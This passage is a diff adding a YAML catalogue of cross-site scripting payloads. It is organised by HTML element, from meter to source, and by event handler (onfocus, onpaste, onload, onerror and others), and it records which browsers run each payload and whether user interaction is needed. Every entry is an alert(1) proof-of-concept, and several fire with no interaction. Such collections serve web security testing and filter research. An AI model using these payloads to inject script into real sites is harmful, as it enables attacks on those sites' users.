+    - <meter id=x tabindex=1 onfocus=alert(1)></meter>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <meter id=x tabindex=1 onfocusin=alert(1)></meter>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <meter onpaste="alert(1)" contenteditable>test</meter>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+multicol:
+  onbeforecopy:
+    payloads:
+    - <multicol onbeforecopy="alert(1)" contenteditable>test</multicol>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <multicol onbeforecut="alert(1)" contenteditable>test</multicol>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <multicol id=x tabindex=1 onfocus=alert(1)></multicol>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <multicol id=x tabindex=1 onfocusin=alert(1)></multicol>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <multicol onpaste="alert(1)" contenteditable>test</multicol>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+nav:
+  onbeforecopy:
+    payloads:
+    - <nav onbeforecopy="alert(1)" contenteditable>test</nav>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <nav onbeforecut="alert(1)" contenteditable>test</nav>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <nav id=x tabindex=1 onfocus=alert(1)></nav>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <nav id=x tabindex=1 onfocusin=alert(1)></nav>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <nav onpaste="alert(1)" contenteditable>test</nav>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+nextid:
+  onbeforecopy:
+    payloads:
+    - <nextid onbeforecopy="alert(1)" contenteditable>test</nextid>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <nextid onbeforecut="alert(1)" contenteditable>test</nextid>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <nextid id=x tabindex=1 onfocus=alert(1)></nextid>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <nextid onpaste="alert(1)" contenteditable>test</nextid>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+nobr:
+  onbeforecopy:
+    payloads:
+    - <nobr onbeforecopy="alert(1)" contenteditable>test</nobr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <nobr onbeforecut="alert(1)" contenteditable>test</nobr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <nobr id=x tabindex=1 onfocus=alert(1)></nobr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <nobr onpaste="alert(1)" contenteditable>test</nobr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+noembed:
+  onbeforecopy:
+    payloads:
+    - <noembed onbeforecopy="alert(1)" contenteditable>test</noembed>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <noembed onbeforecut="alert(1)" contenteditable>test</noembed>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <noembed id=x tabindex=1 onfocus=alert(1)></noembed>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <noembed onpaste="alert(1)" contenteditable>test</noembed>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+noframes:
+  onbeforecopy:
+    payloads:
+    - <noframes onbeforecopy="alert(1)" contenteditable>test</noframes>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <noframes onbeforecut="alert(1)" contenteditable>test</noframes>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <noframes id=x tabindex=1 onfocus=alert(1)></noframes>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <noframes id=x tabindex=1 onfocusin=alert(1)></noframes>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <noframes onpaste="alert(1)" contenteditable>test</noframes>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+noscript:
+  onbeforecopy:
+    payloads:
+    - <noscript onbeforecopy="alert(1)" contenteditable>test</noscript>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <noscript onbeforecut="alert(1)" contenteditable>test</noscript>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <noscript id=x tabindex=1 onfocus=alert(1)></noscript>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <noscript onpaste="alert(1)" contenteditable>test</noscript>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+object:
+  onbeforecopy:
+    payloads:
+    - <object onbeforecopy="alert(1)" contenteditable>test</object>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <object onbeforecut="alert(1)" contenteditable>test</object>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <object onerror=alert(1) data=1 type=image/gif>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onfocus:
+    payloads:
+    - <object id=x onfocus=alert(1) type=text/html>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <object id=x onfocusin=alert(1) type=text/html>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <object data=/ onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <object onpaste="alert(1)" contenteditable>test</object>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+ol:
+  onbeforecopy:
+    payloads:
+    - <ol onbeforecopy="alert(1)" contenteditable>test</ol>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <ol onbeforecut="alert(1)" contenteditable>test</ol>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <ol id=x tabindex=1 onfocus=alert(1)></ol>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <ol id=x tabindex=1 onfocusin=alert(1)></ol>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <ol onpaste="alert(1)" contenteditable>test</ol>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+optgroup:
+  onbeforecopy:
+    payloads:
+    - <optgroup onbeforecopy="alert(1)" contenteditable>test</optgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <optgroup onbeforecut="alert(1)" contenteditable>test</optgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <optgroup onpaste="alert(1)" contenteditable>test</optgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+option:
+  onbeforecopy:
+    payloads:
+    - <option onbeforecopy="alert(1)" contenteditable>test</option>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <option onbeforecut="alert(1)" contenteditable>test</option>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <option id=x tabindex=1 onfocus=alert(1)></option>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <option id=x tabindex=1 onfocusin=alert(1)></option>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <option onpaste="alert(1)" contenteditable>test</option>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+output:
+  onbeforecopy:
+    payloads:
+    - <output onbeforecopy="alert(1)" contenteditable>test</output>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <output onbeforecut="alert(1)" contenteditable>test</output>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <output id=x tabindex=1 onfocus=alert(1)></output>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <output id=x tabindex=1 onfocusin=alert(1)></output>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <output onpaste="alert(1)" contenteditable>test</output>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+p:
+  onbeforecopy:
+    payloads:
+    - <p onbeforecopy="alert(1)" contenteditable>test</p>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <p onbeforecut="alert(1)" contenteditable>test</p>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <p id=x tabindex=1 onfocus=alert(1)></p>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <p id=x tabindex=1 onfocusin=alert(1)></p>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <p onpaste="alert(1)" contenteditable>test</p>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+param:
+  onbeforecopy:
+    payloads:
+    - <param onbeforecopy="alert(1)" contenteditable>test</param>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <param onbeforecut="alert(1)" contenteditable>test</param>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <param id=x tabindex=1 onfocus=alert(1)></param>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <param id=x tabindex=1 onfocusin=alert(1)></param>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <param onpaste="alert(1)" contenteditable>test</param>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+picture:
+  onbeforecopy:
+    payloads:
+    - <picture onbeforecopy="alert(1)" contenteditable>test</picture>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <picture onbeforecut="alert(1)" contenteditable>test</picture>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <picture id=x tabindex=1 onfocus=alert(1)></picture>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <picture id=x tabindex=1 onfocusin=alert(1)></picture>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <picture onpaste="alert(1)" contenteditable>test</picture>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+plaintext:
+  onbeforecopy:
+    payloads:
+    - <plaintext onbeforecopy="alert(1)" contenteditable>test</plaintext>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <plaintext onbeforecut="alert(1)" contenteditable>test</plaintext>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <plaintext onpaste="alert(1)" contenteditable>test</plaintext>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+pre:
+  onbeforecopy:
+    payloads:
+    - <pre onbeforecopy="alert(1)" contenteditable>test</pre>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <pre onbeforecut="alert(1)" contenteditable>test</pre>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <pre id=x tabindex=1 onfocus=alert(1)></pre>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <pre id=x tabindex=1 onfocusin=alert(1)></pre>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <pre onpaste="alert(1)" contenteditable>test</pre>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+progress:
+  onbeforecopy:
+    payloads:
+    - <progress onbeforecopy="alert(1)" contenteditable>test</progress>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <progress onbeforecut="alert(1)" contenteditable>test</progress>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <progress id=x tabindex=1 onfocus=alert(1)></progress>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <progress id=x tabindex=1 onfocusin=alert(1)></progress>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <progress onpaste="alert(1)" contenteditable>test</progress>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+q:
+  onbeforecopy:
+    payloads:
+    - <q onbeforecopy="alert(1)" contenteditable>test</q>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <q onbeforecut="alert(1)" contenteditable>test</q>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <q id=x tabindex=1 onfocus=alert(1)></q>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <q id=x tabindex=1 onfocusin=alert(1)></q>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <q onpaste="alert(1)" contenteditable>test</q>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+rb:
+  onbeforecopy:
+    payloads:
+    - <rb onbeforecopy="alert(1)" contenteditable>test</rb>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <rb onbeforecut="alert(1)" contenteditable>test</rb>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <rb id=x tabindex=1 onfocus=alert(1)></rb>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <rb id=x tabindex=1 onfocusin=alert(1)></rb>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <rb onpaste="alert(1)" contenteditable>test</rb>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+rp:
+  onbeforecopy:
+    payloads:
+    - <rp onbeforecopy="alert(1)" contenteditable>test</rp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <rp onbeforecut="alert(1)" contenteditable>test</rp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <rp id=x tabindex=1 onfocus=alert(1)></rp>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <rp id=x tabindex=1 onfocusin=alert(1)></rp>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <rp onpaste="alert(1)" contenteditable>test</rp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+rt:
+  onbeforecopy:
+    payloads:
+    - <rt onbeforecopy="alert(1)" contenteditable>test</rt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <rt onbeforecut="alert(1)" contenteditable>test</rt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <rt id=x tabindex=1 onfocus=alert(1)></rt>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <rt id=x tabindex=1 onfocusin=alert(1)></rt>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <rt onpaste="alert(1)" contenteditable>test</rt>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+rtc:
+  onbeforecopy:
+    payloads:
+    - <rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <rtc onbeforecut="alert(1)" contenteditable>test</rtc>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <rtc id=x tabindex=1 onfocus=alert(1)></rtc>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <rtc onpaste="alert(1)" contenteditable>test</rtc>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+ruby:
+  onbeforecopy:
+    payloads:
+    - <ruby onbeforecopy="alert(1)" contenteditable>test</ruby>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <ruby onbeforecut="alert(1)" contenteditable>test</ruby>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <ruby id=x tabindex=1 onfocus=alert(1)></ruby>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <ruby id=x tabindex=1 onfocusin=alert(1)></ruby>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <ruby onpaste="alert(1)" contenteditable>test</ruby>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+s:
+  onbeforecopy:
+    payloads:
+    - <s onbeforecopy="alert(1)" contenteditable>test</s>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <s onbeforecut="alert(1)" contenteditable>test</s>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <s id=x tabindex=1 onfocus=alert(1)></s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <s id=x tabindex=1 onfocusin=alert(1)></s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <s onpaste="alert(1)" contenteditable>test</s>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+samp:
+  onbeforecopy:
+    payloads:
+    - <samp onbeforecopy="alert(1)" contenteditable>test</samp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <samp onbeforecut="alert(1)" contenteditable>test</samp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <samp id=x tabindex=1 onfocus=alert(1)></samp>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <samp id=x tabindex=1 onfocusin=alert(1)></samp>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <samp onpaste="alert(1)" contenteditable>test</samp>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+script:
+  onbeforecopy:
+    payloads:
+    - <script onbeforecopy="alert(1)" contenteditable>test</script>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <script onbeforecut="alert(1)" contenteditable>test</script>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <script onerror=alert(1) src=/></script>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <script id=x tabindex=1 onfocus=alert(1)></script>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <script id=x tabindex=1 onfocusin=alert(1)></script>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <script onload=alert(1) src=validjs.js></script>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <script onpaste="alert(1)" contenteditable>test</script>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+section:
+  onbeforecopy:
+    payloads:
+    - <section onbeforecopy="alert(1)" contenteditable>test</section>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <section onbeforecut="alert(1)" contenteditable>test</section>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <section id=x tabindex=1 onfocus=alert(1)></section>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <section id=x tabindex=1 onfocusin=alert(1)></section>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <section onpaste="alert(1)" contenteditable>test</section>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+select:
+  onbeforecopy:
+    payloads:
+    - <select onbeforecopy="alert(1)" contenteditable>test</select>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <select onbeforecut="alert(1)" contenteditable>test</select>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onchange:
+    payloads:
+    - <select onchange=alert(1)><option>change me</option><option>XSS</option></select>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <select autofocus onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocusin:
+    payloads:
+    - <select autofocus onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <select onpaste="alert(1)" contenteditable>test</select>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+set:
+  onbegin:
+    payloads:
+    - <svg><set onbegin=alert(1) attributename=x dur=1s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onend:
+    payloads:
+    - <svg><set onend=alert(1) attributename=x dur=1s>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onrepeat:
+    payloads:
+    - <svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+shadow:
+  onbeforecopy:
+    payloads:
+    - <shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <shadow onbeforecut="alert(1)" contenteditable>test</shadow>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <shadow id=x tabindex=1 onfocus=alert(1)></shadow>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <shadow onpaste="alert(1)" contenteditable>test</shadow>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+slot:
+  onbeforecopy:
+    payloads:
+    - <slot onbeforecopy="alert(1)" contenteditable>test</slot>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <slot onbeforecut="alert(1)" contenteditable>test</slot>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <slot id=x tabindex=1 onfocus=alert(1)></slot>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <slot id=x tabindex=1 onfocusin=alert(1)></slot>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <slot onpaste="alert(1)" contenteditable>test</slot>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+small:
+  onbeforecopy:
+    payloads:
+    - <small onbeforecopy="alert(1)" contenteditable>test</small>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <small onbeforecut="alert(1)" contenteditable>test</small>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <small id=x tabindex=1 onfocus=alert(1)></small>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <small id=x tabindex=1 onfocusin=alert(1)></small>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <small onpaste="alert(1)" contenteditable>test</small>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+source:
+  onbeforecopy:
+    payloads:
+    - <source onbeforecopy="alert(1)" contenteditable>test</source>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <source onbeforecut="alert(1)" contenteditable>test</source>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <video><source onerror=alert(1) src=1></video>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
